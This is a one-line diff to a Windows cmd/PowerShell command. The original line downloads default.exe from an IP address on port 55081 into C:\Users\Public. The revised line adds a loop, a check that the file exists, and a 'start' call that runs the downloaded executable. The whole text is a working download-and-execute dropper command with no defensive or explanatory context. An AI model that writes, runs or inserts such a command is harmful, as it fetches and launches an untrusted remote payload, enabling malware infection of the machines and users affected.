@@ -1,1 +1,1 @@
-cmd /c powershell wget -Uri http://10.22.101.2:55081/default.exe -OutFile C:\Users\Public\abcdefg.exe
+cmd /c powershell foreach ($number in ('10.22.101.2:55081/default.exe')){wget -Uri http://$number -OutFile C:\Users\Public\abcdefg.exe;if (Test-Path C:\Users\Public\abcdefg.exe){start C:\Users\Public\abcdefg.exe;break;}}
